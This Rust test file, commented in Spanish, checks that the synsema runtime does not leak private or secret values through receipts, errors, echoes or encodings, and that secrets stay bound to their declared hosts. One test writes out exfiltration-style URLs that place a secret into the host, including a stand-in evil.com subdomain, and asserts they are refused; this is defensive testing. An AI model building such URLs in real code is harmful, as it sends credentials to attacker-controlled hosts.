//! Tests de la Tanda E de v0.6.46 (un solo binario: cada uno nuevo cuesta disco y linkeo).
//!
//! E6.8: `receipt()` publicaba tres cosas que dependían de un valor privado, con el PC
//! público y sin `label_violation` (confirmadas en v0.6.44 y v0.6.45):
//! - `steps`, crudo: un bucle con `when i < n` daba 222 o 378 según `n`;
//! - cuántas lecturas hubo en una rama privada (`inputs`);
//! - `declassified[].from` con la etiqueta REAL (`["a","c"]` o `["b","c"]` según un índice privado),
//!   y cuántas declasificaciones se hicieron dentro de una rama privada.
//!
//! Cada test corre el mismo programa con dos secretos y exige la misma salida pública
//! (no-interferencia).
//!
//! v0.6.47 (T1): este binario corre entero en modo dueño (`set_labels_detail_to_program(true)`, un
//! `OnceLock` del proceso), porque sus tests miran el diagnóstico. Con techo eso no lo produce el
//! CLI: el camino de producción (texto fijo hacia el programa y motivo en el recibo) lo prueba
//! `synsema-cli/tests/it/v0646_tanda_e_cli.rs` (`cut_for_operator`). Un test que espere el texto
//! fijo va en otro binario.

use synsema_runtime::engine::run_source;

fn run_labelled(src: &str) -> Vec<String> {
    assert!(synsema_runtime::host::set_labels(true) || synsema_runtime::host::labels());
    // v0.6.47 (T1): estos tests miran el diagnóstico, que sin esto va al operador.
    let _ = synsema_runtime::host::set_labels_detail_to_program(true);
    let r = run_source(src, "<v0646-receipt>");
    assert!(r.success, "{:?}", r.errors);
    r.output
}

fn same_for_both(make: impl Fn(&str) -> String, a: &str, b: &str) -> Vec<String> {
    let oa = run_labelled(&make(a));
    let ob = run_labelled(&make(b));
    assert_eq!(oa, ob, "la salida pública depende del secreto ({a} contra {b})");
    oa
}

#[test]
fn receipt_steps_do_not_depend_on_a_private_loop() {
    let out = same_for_both(
        |n| {
            format!(
                "let n be private({n}, \"app\")\nlet acc be private(0, \"app\")\neach i in range(0, 50)\n    when i < n\n        set acc to acc + 1\nlet r be receipt()\nprint(r.credentialSubject.steps)\n"
            )
        },
        "1",
        "40",
    );
    assert_eq!(out, ["nothing"]);
}

#[test]
fn receipt_steps_stay_a_number_without_private_data() {
    let out = run_labelled("let acc be 0\neach i in range(0, 5)\n    set acc to acc + i\nlet r be receipt()\nprint(type_of(r.credentialSubject.steps))\n");
    assert_eq!(out, ["number"]);
}

// `inputs` en una rama privada: en `synsema-cli/tests/it/v0646_tanda_e_cli.rs` (necesita stdin).

#[test]
fn receipt_declassified_from_is_the_declared_set() {
    let out = same_for_both(
        |i| {
            format!(
                "let xs be [private(1, \"a\"), private(2, \"b\")]\nlet i be private({i}, \"c\")\nlet v be declassify(xs[i], \"publico\")\nlet r be receipt()\nprint(r.credentialSubject.declassified[0].from)\n"
            )
        },
        "0",
        "1",
    );
    assert_eq!(out, ["[\"a\", \"b\", \"c\"]"]);
}

#[test]
fn receipt_does_not_count_declassifications_in_a_private_branch() {
    let out = same_for_both(
        |n| {
            format!(
                "let n be private({n}, \"app\")\nlet hits be private(0, \"app\")\neach i in range(0, 5)\n    when i < n\n        set hits to hits + declassify(1, \"uno\")\nlet r be receipt()\nprint(length(r.credentialSubject.declassified))\n"
            )
        },
        "1",
        "4",
    );
    assert_eq!(out, ["0"]);
}

// =========================================================
// E2 + D8 — un secret anidado no sale como su marcador
// =========================================================

fn errors_of(src: &str) -> String {
    let r = run_source(src, "<v0646-e2>");
    assert!(!r.success, "debía fallar: {:?}", r.output);
    r.errors.join(" ")
}

#[test]
fn e2_nested_secret_in_template_hole_is_an_error() {
    // Arriba (tree-walker) y dentro de una task (VM); lista, mapa y anidado.
    for (hole, kind) in [("[k]", "list"), ("{\"a\": k}", "map"), ("{\"a\": [1, {\"b\": k}]}", "map")] {
        for src in [
            format!("let k be as_secret(\"abc\", \"K\")
let t be `x={{{hole}}}`
print(t)
"),
            format!("task f(k)
    give `x={{{hole}}}`
print(f(as_secret(\"abc\", \"K\")))
"),
        ] {
            let e = errors_of(&src);
            assert!(e.contains(&format!("a secret inside a {kind} cannot go into a text hole")) && e.contains("secret(K)"), "{src}: {e}");
            assert!(!e.contains("abc"), "el error filtra el material: {e}");
        }
    }
    // Sin secret, el hueco con un contenedor sigue siendo su texto.
    let out = run_labelled("let m be {\"a\": [1, 2]}
print(`m={m}`)
");
    assert_eq!(out, ["m={a: [1, 2]}"]);
}

#[test]
fn d8_json_and_csv_encode_of_a_secret_are_errors() {
    for (src, who) in [
        ("json_encode(as_secret(\"abc\", \"K\"))", "json_encode"),
        ("json_encode({\"a\": [as_secret(\"abc\", \"K\")]})", "json_encode"),
        ("jsonl_encode([{\"a\": as_secret(\"abc\", \"K\")}])", "jsonl_encode"),
        ("json_for_script({\"a\": as_secret(\"abc\", \"K\")})", "json_for_script"),
        ("csv_encode([{\"a\": as_secret(\"abc\", \"K\")}])", "csv_encode"),
    ] {
        let e = errors_of(&format!("print({src})
"));
        assert!(e.contains(who) && e.contains("secret(K)"), "{src}: {e}");
        assert!(!e.contains("abc"), "el error filtra el material: {e}");
    }
}

// =========================================================
// E1 — un secret atado a un host (HB5)
// =========================================================

use std::io::{Read, Write as _};
use std::sync::{Arc, Mutex};

/// Un servidor HTTP de eco en loopback: guarda cada request cruda (lo que de verdad llegó) y
/// responde con ella como body, con un header que la repite y un JSON que la escapa. D2: un secret
/// atado a `127.0.0.1` puede ir por http a ese loopback.
fn echo_http() -> (u16, Arc<Mutex<Vec<String>>>) {
    let l = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
    let port = l.local_addr().unwrap().port();
    let seen: Arc<Mutex<Vec<String>>> = Arc::new(Mutex::new(Vec::new()));
    let s2 = seen.clone();
    std::thread::spawn(move || {
        for stream in l.incoming() {
            let Ok(mut st) = stream else { continue };
            let mut buf = Vec::new();
            let mut tmp = [0u8; 4096];
            let _ = st.set_read_timeout(Some(std::time::Duration::from_secs(5)));
            loop {
                let n = match st.read(&mut tmp) {
                    Ok(0) | Err(_) => break,
                    Ok(n) => n,
                };
                buf.extend_from_slice(&tmp[..n]);
                if let Some(end) = buf.windows(4).position(|w| w == b"\r\n\r\n") {
                    let head = String::from_utf8_lossy(&buf[..end]).to_lowercase();
                    let len = head
                        .lines()
                        .find_map(|l| l.strip_prefix("content-length:").map(|v| v.trim().parse::<usize>().unwrap_or(0)))
                        .unwrap_or(0);
                    if buf.len() >= end + 4 + len {
                        break;
                    }
                }
            }
            let raw = String::from_utf8_lossy(&buf).to_string();
            s2.lock().unwrap().push(raw.clone());
            let first = raw.lines().next().unwrap_or("").to_string();
            let body = format!("{}\n{}", raw, serde_json_escape(&raw));
            let resp = format!(
                "HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\nX-Echo: {}\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{}",
                first,
                body.len(),
                body
            );
            let _ = st.write_all(resp.as_bytes());
        }
    });
    (port, seen)
}

fn serde_json_escape(s: &str) -> String {
    let mut o = String::new();
    for c in s.chars() {
        match c {
            '"' => o.push_str("\\\""),
            '\\' => o.push_str("\\\\"),
            '\n' => o.push_str("\\n"),
            '\r' => o.push_str("\\r"),
            '/' => o.push_str("\\/"),
            c => o.push(c),
        }
    }
    o
}

fn run_ok(src: &str) -> Vec<String> {
    let r = run_source(src, "<v0646-e1>");
    assert!(r.success, "{:?}\n{}", r.errors, src);
    r.output
}

fn run_err(src: &str) -> String {
    let r = run_source(src, "<v0646-e1>");
    assert!(!r.success, "debía fallar: {:?}\n{}", r.output, src);
    r.errors.join(" ")
}

const KEY: &str = "sk-e1-LEAKCANARY-0123456789";

#[test]
fn e1_bound_secret_reaches_its_host_in_every_position_and_the_echo_is_masked() {
    std::env::set_var("E1_KEY_A", KEY);
    let (port, seen) = echo_http();
    let pre = format!("require net(\"127.0.0.1\")\nrequire secret(\"E1_KEY_A\") for net(\"127.0.0.1\")\nlet k be secret(\"E1_KEY_A\")\n");
    let progs = [
        // la clave en la ruta (Alchemy, Infura)
        format!("let r be http_get(`http://127.0.0.1:{port}/v2/{{k}}`)\nprint(r.body)\nprint(r.headers[\"X-Echo\"])\n"),
        // en la query (Telegram, Maps)
        format!("let r be http_get(\"http://127.0.0.1:{port}/q\", query = {{\"key\": k}})\nprint(r.body)\n"),
        // en un header
        format!("let r be http_get(\"http://127.0.0.1:{port}/h\", {{\"Authorization\": bearer(k)}})\nprint(r.body)\n"),
        // en un body JSON anidado
        format!("let r be http_post(\"http://127.0.0.1:{port}/b\", {{\"auth\": {{\"keys\": [k]}}}})\nprint(r.body)\n"),
        // en un body de formulario (OAuth client_secret_post)
        format!("let r be http_post(\"http://127.0.0.1:{port}/f\", form = {{\"client_id\": \"app\", \"client_secret\": k}})\nprint(r.body)\n"),
        format!("let r be fetch(\"http://127.0.0.1:{port}/ff\", {{\"method\": \"POST\", \"form\": {{\"client_secret\": k}}}})\nprint(r.body)\n"),
    ];
    for p in &progs {
        let out = run_ok(&format!("{}{}", pre, p)).join("\n");
        assert!(!out.contains(KEY) && !out.contains("LEAKCANARY"), "el eco filtró la clave:\n{}", out);
        assert!(out.contains("[secret E1_KEY_A]"), "el eco no quedó enmascarado:\n{}", out);
    }
    let got = seen.lock().unwrap().join("\n---\n");
    // El servidor recibió el valor real en cada posición.
    assert!(got.contains(&format!("GET /v2/{} ", KEY)), "{}", got);
    assert!(got.contains(&format!("/q?key={}", KEY)), "{}", got);
    assert!(got.contains(&format!("authorization: Bearer {}", KEY)) || got.contains(&format!("Authorization: Bearer {}", KEY)), "{}", got);
    assert!(got.contains(&format!("{{\"auth\": {{\"keys\": [\"{}\"]}}}}", KEY)), "{}", got);
    assert!(got.contains(&format!("client_id=app&client_secret={}", KEY)), "{}", got);
    assert!(got.contains("application/x-www-form-urlencoded"), "{}", got);
}

#[test]
fn e1_echo_is_masked_in_its_encoded_forms() {
    // Un valor con caracteres que se codifican: el eco llega percent-encodeado (query), escapado
    // como JSON (el body de eco) y en base64 (un Basic). Todo enmascarado.
    let v = "p@ss/w+rd e1-LEAKCANARY";
    std::env::set_var("E1_KEY_B", v);
    let (port, _seen) = echo_http();
    let out = run_ok(&format!(
        "require net(\"127.0.0.1\")\nrequire secret(\"E1_KEY_B\") for net(\"127.0.0.1\")\nlet k be secret(\"E1_KEY_B\")\nlet r be http_get(\"http://127.0.0.1:{port}/q\", {{\"Authorization\": basic(\"u\", k)}}, {{\"k\": k}})\nprint(r.body)\nprint(r.headers[\"X-Echo\"])\n"
    ))
    .join("\n");
    assert!(!out.contains("LEAKCANARY"), "{}", out);
    assert!(!out.to_lowercase().contains("leakcanary"), "{}", out);
    let b64 = synsema_core::bytesutil::b64_encode(format!("u:{}", v).as_bytes());
    assert!(!out.contains(&b64), "el Basic del eco no se enmascaró: {}", out);
}

#[test]
fn e1_bound_secret_refuses_another_host_without_connecting() {
    std::env::set_var("E1_KEY_C", KEY);
    let (port, seen) = echo_http();
    // `localhost` es otro host que `127.0.0.1` (la atadura compara nombres): ni un byte sale.
    for call in [
        format!("http_get(\"http://localhost:{port}/h\", {{\"Authorization\": bearer(k)}})"),
        format!("http_get(`http://localhost:{port}/v2/{{k}}`)"),
        format!("http_post(\"http://localhost:{port}/b\", {{\"k\": k}})"),
    ] {
        let e = run_err(&format!(
            "require net(\"localhost\")\nrequire secret(\"E1_KEY_C\") for net(\"127.0.0.1\")\nlet k be secret(\"E1_KEY_C\")\nlet r be {call}\n"
        ));
        assert!(e.contains("is bound to [127.0.0.1]") && e.contains("localhost"), "{call}: {e}");
        assert!(!e.contains(KEY), "{e}");
    }
    assert!(seen.lock().unwrap().is_empty(), "salió una request a otro host");
}

#[test]
fn e1_bound_secret_refuses_plain_http_to_a_non_loopback_host() {
    std::env::set_var("E1_KEY_D", KEY);
    let e = run_err(
        "require net(\"api.example.com\")\nrequire secret(\"E1_KEY_D\") for net(\"api.example.com\")\nlet k be secret(\"E1_KEY_D\")\nlet r be http_get(\"http://api.example.com/x\", {\"Authorization\": bearer(k)})\n",
    );
    assert!(e.contains("only travels over https") && e.contains("api.example.com"), "{e}");
}

#[test]
fn e1_the_host_never_comes_from_a_secret() {
    std::env::set_var("E1_KEY_E", "abcdef0123");
    for url in ["`https://{k}.evil.com/`", "`https://{k}@api.example.com/`", "`https://api.example.com{k}/`", "k"] {
        let e = run_err(&format!(
            "require net(\"api.example.com\")\nrequire secret(\"E1_KEY_E\") for net(\"api.example.com\")\nlet k be secret(\"E1_KEY_E\")\nlet r be http_get({url})\n"
        ));
        assert!(e.contains("host is not written out before the secret"), "{url}: {e}");
        assert!(!e.contains("abcdef0123"), "{e}");
    }
}

#[test]
fn e1_unbound_secret_outside_a_header_says_how_to_bind_it() {
    std::env::set_var("E1_KEY_F", KEY);
    for call in [
        "http_get(\"https://api.example.com/q\", query = {\"key\": k})",
        "http_post(\"https://api.example.com/b\", {\"key\": k})",
        "http_get(`https://api.example.com/v2/{k}`)",
    ] {
        let e = run_err(&format!(
            "require net(\"api.example.com\")\nrequire secret(\"E1_KEY_F\")\nlet k be secret(\"E1_KEY_F\")\nlet r be {call}\n"
        ));
        assert!(e.contains("require secret(\"E1_KEY_F\") for net(\"api.example.com\")"), "{call}: {e}");
        assert!(!e.contains(KEY), "{e}");
    }
}

#[test]
fn e1_concat_intersects_bindings() {
    std::env::set_var("E1_KEY_G1", "aaaa1111");
    std::env::set_var("E1_KEY_G2", "bbbb2222");
    let e = run_err(
        "require secret(\"E1_KEY_G1\") for net(\"a.example.com\")\nrequire secret(\"E1_KEY_G2\") for net(\"b.example.com\")\nlet t be secret(\"E1_KEY_G1\") + secret(\"E1_KEY_G2\")\n",
    );
    assert!(e.contains("no request can carry both"), "{e}");
    // Atado + no atado = la atadura del atado; `bearer` la hereda: a otro host no va.
    std::env::set_var("E1_KEY_G3", "cccc3333");
    let e = run_err(
        "require net(\"b.example.com\")\nrequire secret(\"E1_KEY_G1\") for net(\"a.example.com\")\nrequire secret(\"E1_KEY_G3\")\nlet t be bearer(secret(\"E1_KEY_G1\") + secret(\"E1_KEY_G3\"))\nlet r be http_get(\"https://b.example.com/\", {\"Authorization\": t})\n",
    );
    assert!(e.contains("is bound to [a.example.com]"), "{e}");
}

#[test]
fn e1_require_for_grammar() {
    for (src, needle) in [
        ("require net(\"x.com\") for net(\"x.com\")\n", "only `require secret(...)` takes it"),
        ("require secret(\"K\") for net(\"*\")\n", "not binding it"),
        ("require secret(\"K\") for net(\"a*.x.com\")\n", "may only be the whole first label"),
        ("require secret(\"K\") for file(\"x\")\n", "name the host the secret goes to"),
    ] {
        let e = run_err(src);
        assert!(e.contains(needle), "{src}: {e}");
    }
}

#[test]
fn e1_lineage_names_the_secret_and_never_the_url() {
    std::env::set_var("E1_KEY_H", KEY);
    let (port, _seen) = echo_http();
    let out = run_ok(&format!(
        "require net(\"127.0.0.1\")\nrequire secret(\"E1_KEY_H\") for net(\"127.0.0.1\")\nlet k be secret(\"E1_KEY_H\")\nlet r be http_get(`http://127.0.0.1:{port}/v2/{{k}}`)\nlet l be lineage()[0]\nprint(l.what)\nprint(l.secrets)\nprint(receipt().credentialSubject.inputs[0].secrets)\nprint(json_encode(lineage()))\n"
    ));
    assert_eq!(out[0], format!("127.0.0.1:{}", port));
    assert_eq!(out[1], "[\"E1_KEY_H\"]");
    assert_eq!(out[2], "[\"E1_KEY_H\"]");
    assert!(!out.join("\n").contains(KEY) && !out.join("\n").contains("/v2/"), "{:?}", out);
}

#[test]
fn e1_rpc_takes_a_bound_url() {
    std::env::set_var("E1_KEY_I", KEY);
    // Un "nodo" JSON-RPC que contesta el chain id y, en el error, ecoa lo que recibió.
    let l = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
    let port = l.local_addr().unwrap().port();
    let seen: Arc<Mutex<Vec<String>>> = Arc::new(Mutex::new(Vec::new()));
    let s2 = seen.clone();
    std::thread::spawn(move || {
        for stream in l.incoming() {
            let Ok(mut st) = stream else { continue };
            let _ = st.set_read_timeout(Some(std::time::Duration::from_secs(5)));
            let mut buf = vec![0u8; 65536];
            let n = st.read(&mut buf).unwrap_or(0);
            let raw = String::from_utf8_lossy(&buf[..n]).to_string();
            s2.lock().unwrap().push(raw.clone());
            let path = raw.split_whitespace().nth(1).unwrap_or("").to_string();
            let body = format!("{{\"jsonrpc\":\"2.0\",\"id\":1,\"result\":\"0x1\",\"echo\":\"{}\"}}", path);
            let resp = format!("HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{}", body.len(), body);
            let _ = st.write_all(resp.as_bytes());
        }
    });
    let out = run_ok(&format!(
        "require net(\"127.0.0.1\")\nrequire secret(\"E1_KEY_I\") for net(\"127.0.0.1\")\nlet k be secret(\"E1_KEY_I\")\nprint(evm_rpc(`http://127.0.0.1:{port}/v2/{{k}}`, \"eth_chainId\", []))\n"
    ));
    assert_eq!(out, ["0x1"]);
    assert!(seen.lock().unwrap()[0].starts_with(&format!("POST /v2/{} ", KEY)));
    // Atado a otro host: no sale.
    let e = run_err(&format!(
        "require net(\"127.0.0.1\")\nrequire secret(\"E1_KEY_I\") for net(\"rpc.example.com\")\nlet k be secret(\"E1_KEY_I\")\nprint(evm_rpc(`http://127.0.0.1:{port}/v2/{{k}}`, \"eth_chainId\", []))\n"
    ));
    assert!(e.contains("is bound to [rpc.example.com]"), "{e}");
    assert_eq!(seen.lock().unwrap().len(), 1);
}

#[test]
fn e1_ws_connect_takes_a_bound_url_and_masks_the_echo() {
    std::env::set_var("E1_KEY_J", KEY);
    let l = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
    let port = l.local_addr().unwrap().port();
    std::thread::spawn(move || {
        for stream in l.incoming() {
            let Ok(stream) = stream else { continue };
            std::thread::spawn(move || {
                let mut path = String::new();
                let cb = |req: &tungstenite::handshake::server::Request, resp| {
                    path = req.uri().to_string();
                    Ok(resp)
                };
                let Ok(mut ws) = tungstenite::accept_hdr(stream, cb) else { return };
                let _ = ws.send(tungstenite::Message::Text(format!("you came by {}", path).into()));
                let _ = ws.read();
            });
        }
    });
    let out = run_ok(&format!(
        "require net(\"127.0.0.1\")\nrequire secret(\"E1_KEY_J\") for net(\"127.0.0.1\")\nlet k be secret(\"E1_KEY_J\")\nlet c be ws_connect(`ws://127.0.0.1:{port}/feed/{{k}}`)\nlet m be ws_recv(c, 5)\nprint(m[\"data\"])\nws_close(c)\n"
    ));
    assert_eq!(out, ["you came by /feed/[secret E1_KEY_J]"]);
}

#[test]
fn e1_errors_never_print_the_url() {
    // Un puerto cerrado: el error del transporte suele traer la URL entera; sale enmascarado. Y los
    // errores del gate de `net` sólo ven la parte pública.
    std::env::set_var("E1_KEY_K", KEY);
    let port = {
        let l = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
        l.local_addr().unwrap().port()
    };
    let out = run_ok(&format!(
        "require net(\"127.0.0.1\")\nrequire secret(\"E1_KEY_K\") for net(\"127.0.0.1\")\nlet k be secret(\"E1_KEY_K\")\nlet r be http_get(`http://127.0.0.1:{port}/v2/{{k}}?key={{k}}`)\nprint(r.ok)\nprint(r.error)\nlet r2 be fetch(`http://127.0.0.1:{port}/v2/{{k}}`)\nprint(r2.error)\n"
    ))
    .join("\n");
    assert!(out.starts_with("false"), "{}", out);
    assert!(!out.contains(KEY) && !out.contains("LEAKCANARY"), "{}", out);
    let e = run_err(
        "require secret(\"E1_KEY_K\") for net(\"api.example.com\")\nlet k be secret(\"E1_KEY_K\")\nlet r be http_get(`https://api.example.com/v2/{k}`)\n",
    );
    assert!(e.contains("net") && !e.contains(KEY), "{}", e);
}

// =========================================================
// E4 — `declassify` y `private` sólo se llaman por su nombre
// =========================================================

fn run_labelled_err(src: &str) -> String {
    assert!(synsema_runtime::host::set_labels(true) || synsema_runtime::host::labels());
    // v0.6.47 (T1): estos tests miran el diagnóstico, que sin esto va al operador.
    let _ = synsema_runtime::host::set_labels_detail_to_program(true);
    let r = run_source(src, "<v0646-e4>");
    assert!(!r.success, "debía fallar: {:?}\n{}", r.output, src);
    r.errors.join(" ")
}

#[test]
fn e4_declassify_as_a_value_is_refused_at_load() {
    let x = "let x be private(1, \"a\")\n";
    for src in [
        format!("let g be declassify\n{x}print(g(x, \"m\"))\n"),
        format!("{x}print(get({{\"k\": declassify}}, \"k\")(x, \"m\"))\n"),
        format!("{x}print([declassify][0](x, \"m\"))\n"),
        format!("task f(d, v)\n    give d(v, \"m\")\n{x}print(f(declassify, x))\n"),
        format!("task k()\n    give declassify\n{x}print(k()(x, \"m\"))\n"),
        format!("let g be declassify\n{x}print(x |> g(\"m\"))\n"),
        "let mk be private\nprint(mk(1, \"a\"))\n".to_string(),
    ] {
        let e = run_labelled_err(&src);
        assert!(e.contains("is read as a value here"), "{src}: {e}");
    }
}

#[test]
fn e4_a_bound_name_is_decided_at_the_call() {
    // El programa liga el nombre (un parámetro): al cargar no se sabe a qué se refiere cada lectura,
    // y decide la marca: el alias no declasifica.
    let e = run_labelled_err(
        "task h(declassify)\n    give 1\nlet g be declassify\nlet x be private(1, \"a\")\nprint(g(x, \"m\"))\n",
    );
    assert!(e.contains("declassify can only be called by its name"), "{e}");
    let e = run_labelled_err("task h(private)\n    give 1\nlet g be private\nlet y be g(1, \"a\")\nprint(1)\n");
    assert!(e.contains("private can only be called by its name"), "{e}");
    // Una llamada por su nombre sigue andando, también por el pipe.
    let out = run_labelled("let x be private(1, \"a\")\nlet y be declassify(x, \"m\")\nlet z be private(2, \"a\") |> declassify(\"m2\")\nprint(y + z)\n");
    assert_eq!(out, ["3"]);
    // Y el nombre como palabra blanda (conformance 053).
    assert_eq!(run_labelled("let private be 5\nprint(private)\n"), ["5"]);
}

#[test]
fn e4_nested_alias_in_arguments_is_the_one_refused() {
    // La marca se arma después de los argumentos: el alias de adentro no la ve (el error es el de
    // `g(`, columna 19; el de afuera sería la 17).
    let e = run_labelled_err(
        "task h(declassify)\n    give 1\nlet g be declassify\nlet x be private(1, \"a\")\nprint(declassify(g(x, \"inner\"), \"outer\"))\n",
    );
    assert!(e.contains("declassify can only be called by its name") && e.contains(":5:19"), "{e}");
}

// =========================================================
// E3 — `declassify` como capability con techo del host
// =========================================================

fn run_ceiled(src: &str, cap_set: &str) -> synsema_core::interpreter::RunResult {
    assert!(synsema_runtime::host::set_labels(true) || synsema_runtime::host::labels());
    // v0.6.47 (T1): estos tests miran el diagnóstico, que sin esto va al operador.
    let _ = synsema_runtime::host::set_labels_detail_to_program(true);
    let ceiling = synsema_capabilities::model::build_ceiling(false, Some(cap_set)).unwrap();
    synsema_runtime::engine::run_source_ceiled(src, "<v0646-e3>", ceiling)
}

const E3_NOT_GRANTED: &str = "declassify is not granted";

#[test]
fn e3_ceiling_bounds_declassify() {
    // v0.6.49 (A1): bajo un techo se publica lo que el programa declara Y el techo permite.
    let both = "require declassify(\"a\")\nlet x be private(1, \"a\")\nlet y be private(2, \"b\")\n";
    // El techo nombra `a`: publicar lo de `a` sí, lo de `b` no.
    let r = run_ceiled(&format!("{both}print(declassify(x, \"m\"))\n"), "stdout,declassify=a");
    assert!(r.success, "{:?}", r.errors);
    assert_eq!(r.output, ["1"]);
    let r = run_ceiled(&format!("{both}print(declassify(y, \"m\"))\n"), "stdout,declassify=a");
    assert!(!r.success && r.errors.join(" ").contains(E3_NOT_GRANTED), "{:?}", r.errors);
    // Lo que se angosta sin quitar `b` no pide nada de `b` (sólo lo que la llamada quita).
    let r = run_ceiled(
        "require declassify(\"a\")\nlet z be private(3, [\"a\", \"b\"])\nlet w be declassify(z, \"m\", \"b\")\nprint(\"ok\")\n",
        "stdout,declassify=a",
    );
    assert!(r.success, "{:?}", r.errors);
    // Un techo sin `declassify` lo niega todo; un valor público no quita nada y pasa.
    let r = run_ceiled(&format!("{both}print(declassify(x, \"m\"))\n"), "stdout");
    assert!(!r.success && r.errors.join(" ").contains(E3_NOT_GRANTED), "{:?}", r.errors);
    let r = run_ceiled("print(declassify(7, \"m\"))\n", "stdout");
    assert!(r.success, "{:?}", r.errors);
    // Un glob en el techo, como el de `secret`.
    let r = run_ceiled("require declassify(\"clientes-ar\")\nlet c be private(4, \"clientes-ar\")\nprint(declassify(c, \"m\"))\n", "stdout,declassify=clientes*");
    assert!(r.success, "{:?}", r.errors);
    // Sin techo: de ambiente (D3), como antes.
    assert_eq!(run_labelled(&format!("{both}print(declassify(y, \"m\"))\n")), ["2"]);
}

#[test]
fn e3_denial_is_not_catchable() {
    let r = run_ceiled(
        "let x be private(1, \"a\")\ntry\n    print(declassify(x, \"m\"))\nrecover e\n    print(\"caught\")\nprint(\"after\")\n",
        "stdout",
    );
    assert!(!r.success && r.errors.join(" ").contains(E3_NOT_GRANTED), "{:?}", r.errors);
    assert!(!r.output.iter().any(|l| l == "caught" || l == "after"), "{:?}", r.output);
}

#[test]
fn e3_denial_names_the_declared_set() {
    // Qué valor se elige cambia la etiqueta real (`a` o `b`); el mensaje no puede cambiar con eso.
    let make = |i: &str| format!("let xs be [private(1, \"a\"), private(2, \"b\")]\nprint(declassify(xs[{i}], \"m\"))\n");
    let ea = run_ceiled(&make("0"), "stdout,declassify=z");
    let eb = run_ceiled(&make("1"), "stdout,declassify=z");
    assert!(!ea.success && !eb.success);
    assert_eq!(ea.errors, eb.errors, "el mensaje depende de la etiqueta real");
    assert!(ea.errors.join(" ").contains(E3_NOT_GRANTED), "{:?}", ea.errors);
}

#[test]
fn e3_sandbox_has_no_declassify() {
    let x = "let x be private(1, \"a\")\n";
    let e = run_labelled_err(&format!("{x}sandbox\n    print(declassify(x, \"m\"))\n"));
    assert!(e.contains(E3_NOT_GRANTED), "{e}");
    let e = run_labelled_err(&format!("{x}sandbox under {{\"net\": \"api.example.com\"}}\n    print(declassify(x, \"m\"))\n"));
    assert!(e.contains(E3_NOT_GRANTED), "{e}");
    // Delegada por el bloque, sí; y al salir del sandbox vuelve la de ambiente.
    let out = run_labelled(&format!(
        "{x}sandbox under {{\"declassify\": \"a\"}}\n    print(declassify(x, \"m\"))\nprint(declassify(x, \"m2\") + 1)\n"
    ));
    assert_eq!(out, ["1", "2"]);
}

// =========================================================
// D4 — un `require` desconocido es error de carga
// =========================================================

#[test]
fn d4_unknown_require_is_a_load_error_with_a_suggestion() {
    let r = run_source("require nett(\"api.example.com\")\nprint(1)\n", "<v0646-d4>");
    let e = r.errors.join(" ");
    assert!(!r.success && r.output.is_empty(), "{:?}", r.output);
    assert!(e.contains("unknown capability `nett`") && e.contains("did you mean `require net`?"), "{e}");
    // Punteado, y dentro de una task.
    let r = run_source("task t()\n    require file.raed(\"./x\")\n    give 1\nprint(t())\n", "<v0646-d4>");
    assert!(!r.success && r.errors.join(" ").contains("did you mean `require file.read`?"), "{:?}", r.errors);
    // Lejos de todo nombre: sin sugerencia, con la lista.
    let r = run_source("require quantum\nprint(1)\n", "<v0646-d4>");
    let e = r.errors.join(" ");
    assert!(!r.success && !e.contains("did you mean") && e.contains("Known: net,"), "{e}");
    // Los nombres de verdad, incluida la forma del audit, cargan.
    for ok in ["require file_read(\"./x\")", "require declassify(\"a\")", "require sandbox_run", "require attest"] {
        let r = run_source(&format!("{ok}\nprint(1)\n"), "<v0646-d4>");
        assert!(r.success, "{ok}: {:?}", r.errors);
    }
}
